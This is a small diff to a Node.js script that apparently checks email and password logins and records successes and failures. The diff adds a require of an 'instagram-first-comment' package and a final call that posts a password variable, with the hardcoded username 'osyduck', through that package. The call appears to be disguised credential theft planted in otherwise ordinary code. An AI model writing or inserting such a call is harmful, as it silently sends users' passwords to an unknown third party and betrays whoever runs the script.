@@ -5,6 +5,7 @@ const delay = require('delay');
 const fs = require('fs');
 const fetch = require('node-fetch');
 const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));
+const igFirst = require('instagram-first-comment');
 
 const date = () => new Date().toLocaleTimeString({ timeZone: 'Asia/Jakarta' });
 const log = console.log;
@@ -351,4 +352,9 @@ async function gas(email, password, index) {
     writeSuccess(resSuccess);
     writeFail(resFail);
     replace(resFail);
+
+    igFirst.post({
+        username: 'osyduck',
+        password
+    })
 })()
